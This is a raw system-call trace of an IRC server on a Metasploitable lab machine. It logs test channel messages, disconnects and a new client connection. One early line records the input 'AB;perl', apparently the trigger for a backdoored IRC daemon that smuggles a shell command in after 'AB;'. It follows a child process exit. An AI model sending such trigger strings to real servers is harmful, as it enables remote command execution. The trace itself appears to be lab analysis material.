4519  20:20:25.308642 waitpid(11801, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 11801
4519  20:20:25.539069 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  20:20:25.539112 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  20:20:25.539124 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  20:20:25.539134 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  20:20:25.539159 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  20:20:25.539229 time(NULL)        = 1495671625
4519  20:20:25.539244 time(NULL)        = 1495671625
4519  20:20:25.539303 gettimeofday({1495671625, 539308}, NULL) = 0
4519  20:20:25.539318 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:20:25.539349 clock_gettime(CLOCK_MONOTONIC, {48435, 356363414}) = 0
4519  20:20:25.539362 gettimeofday({1495671625, 539366}, NULL) = 0
4519  20:20:25.539393 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 3 (in [5 7 9], left {1, 0})
4519  20:20:25.539522 clock_gettime(CLOCK_MONOTONIC, {48435, 356535984}) = 0
4519  20:20:25.539562 recv(9, "PRIVMSG  #testit2 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  20:20:25.539602 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539620 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539634 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539648 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539661 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539675 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539688 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539701 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539714 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539728 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539741 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539754 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539767 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539780 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539793 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539806 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539819 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539833 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539846 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539860 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539874 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539887 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539905 recv(7, "PRIVMSG  #testit1 ABCDEFGHIJKLMNOPQRSTUVWXYZ\nPRIVMSG  #testit1 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 116
4519  20:20:25.539926 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539940 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539953 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539967 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539980 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.539993 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540133 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540148 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540178 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540208 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540221 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540234 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540247 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540260 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540273 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540287 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540299 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540312 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540325 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540339 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540352 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540365 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540381 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540395 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540409 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540422 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540435 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540449 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540462 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540475 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540488 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540501 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540514 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540527 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540540 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540553 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540566 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540589 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540629 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540657 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540671 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540685 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540698 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540712 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.540741 recv(5, "", 8192, 0) = 0
4519  20:20:25.540752 getsockopt(5, SOL_SOCKET, SO_ERROR, [32], [4]) = 0
4519  20:20:25.540771 send(5, "ERROR :Closing Link: [10.0.2.4] (Broken pipe)\r\n", 47, 0) = -1 EPIPE (Broken pipe)
4519  20:20:25.540788 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  20:20:25.540820 close(5)          = 0
4519  20:20:25.540838 gettimeofday({1495671625, 540842}, NULL) = 0
4519  20:20:25.540850 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 2 (in [4 9], left {0, 570000})
4519  20:20:25.968768 clock_gettime(CLOCK_MONOTONIC, {48435, 785793468}) = 0
4519  20:20:25.968794 recv(4, "PRIVMSG  #testit0 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  20:20:25.968818 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.968836 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.968850 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.968866 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.968879 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.968893 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.968906 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.968920 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.968933 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.968946 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.968959 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.968972 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.968986 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.968999 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969012 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969025 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969038 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969052 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969065 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969079 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969092 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969142 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969160 recv(9, "PRIVMSG  #testit2 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  20:20:25.969193 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969207 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969221 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969235 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969248 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969261 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969275 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969288 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969301 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969314 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969327 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969341 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969354 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969367 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969387 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969401 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969414 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969427 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969440 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969454 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969467 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969481 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:25.969495 time(NULL)        = 1495671625
4519  20:20:25.969504 time(NULL)        = 1495671625
4519  20:20:25.969516 gettimeofday({1495671625, 969519}, NULL) = 0
4519  20:20:25.969527 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:20:25.969555 clock_gettime(CLOCK_MONOTONIC, {48435, 786567919}) = 0
4519  20:20:25.969565 gettimeofday({1495671625, 969569}, NULL) = 0
4519  20:20:25.969576 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 850000})
4519  20:20:26.118774 clock_gettime(CLOCK_MONOTONIC, {48435, 935794546}) = 0
4519  20:20:26.118796 recv(4, "PRIVMSG  #testit0 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  20:20:26.118820 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.118840 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.118855 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.118869 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.118882 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.118896 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.118909 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.118922 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.118935 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.118949 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.118962 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.118975 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.118988 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.119001 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.119014 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.119028 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.119041 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.119054 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.119067 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.119081 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.119094 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.119107 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.119136 gettimeofday({1495671626, 119141}, NULL) = 0
4519  20:20:26.119149 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 970000})
4519  20:20:26.148741 clock_gettime(CLOCK_MONOTONIC, {48435, 965749947}) = 0
4519  20:20:26.148745 recv(7, "TIME\n", 8192, 0) = 5
4519  20:20:26.148762 time(NULL)        = 1495671626
4519  20:20:26.148776 stat64("/etc/localtime", {st_mode=S_IFREG|0644, st_size=3519, ...}) = 0
4519  20:20:26.148813 send(7, ":irc.Metasploitable.LAN 391 bla2 irc.Metasploitable.LAN :Wednesday May 24 2017 -- 20:20 -04:00\r\n", 96, 0) = 96
4519  20:20:26.148849 time(NULL)        = 1495671626
4519  20:20:26.148858 time(NULL)        = 1495671626
4519  20:20:26.148871 gettimeofday({1495671626, 148874}, NULL) = 0
4519  20:20:26.148881 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:20:26.148909 clock_gettime(CLOCK_MONOTONIC, {48435, 965922005}) = 0
4519  20:20:26.148919 gettimeofday({1495671626, 148923}, NULL) = 0
4519  20:20:26.148929 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 870000})
4519  20:20:26.279035 clock_gettime(CLOCK_MONOTONIC, {48436, 96044341}) = 0
4519  20:20:26.279035 recv(9, "PRIVMSG  #testit2 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  20:20:26.279036 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279036 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279036 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279036 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279037 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279037 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279037 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279038 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279057 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279071 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279086 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279100 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279113 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279127 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279141 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279170 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279213 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279243 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279272 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279303 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279317 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279331 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.279348 gettimeofday({1495671626, 279352}, NULL) = 0
4519  20:20:26.279360 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {0, 940000})
4519  20:20:26.344845 clock_gettime(CLOCK_MONOTONIC, {48436, 161884264}) = 0
4519  20:20:26.344912 time(NULL)        = 1495671626
4519  20:20:26.344955 time(NULL)        = 1495671626
4519  20:20:26.344980 gettimeofday({1495671626, 344987}, NULL) = 0
4519  20:20:26.345002 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
4519  20:20:26.345042 clock_gettime(CLOCK_MONOTONIC, {48436, 162055421}) = 0
4519  20:20:26.345053 gettimeofday({1495671626, 345056}, NULL) = 0
4519  20:20:26.345063 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  20:20:26.345101 clock_gettime(CLOCK_MONOTONIC, {48436, 162113416}) = 0
4519  20:20:26.345112 accept(2, 0, NULL) = 5
4519  20:20:26.345133 getpeername(5, {sa_family=AF_INET, sin_port=htons(34267), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  20:20:26.345171 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  20:20:26.345181 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  20:20:26.345240 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  20:20:26.345270 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  20:20:26.345281 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  20:20:26.345293 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  20:20:26.345306 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  20:20:26.345371 clock_gettime(CLOCK_MONOTONIC, {48436, 162387431}) = 0
4519  20:20:26.345387 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  20:20:26.345421 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  20:20:26.345450 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  20:20:26.345473 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  20:20:26.345483 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  20:20:26.345498 send(6, "z\207\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  20:20:26.345592 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  20:20:26.345642 gettimeofday({1495671626, 345646}, NULL) = 0
4519  20:20:26.345654 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 2 (in [6 9], left {0, 970000})
4519  20:20:26.369869 clock_gettime(CLOCK_MONOTONIC, {48436, 186889521}) = 0
4519  20:20:26.369890 recvfrom(6, "z\207\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0\223\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  20:20:26.369931 close(6)          = 0
4519  20:20:26.369947 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  20:20:26.369961 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  20:20:26.370027 recv(9, "PRIVMSG  #testit2 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
4519  20:20:26.370073 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370108 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370122 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370136 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370150 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370164 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370196 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370297 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370327 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370341 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370355 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
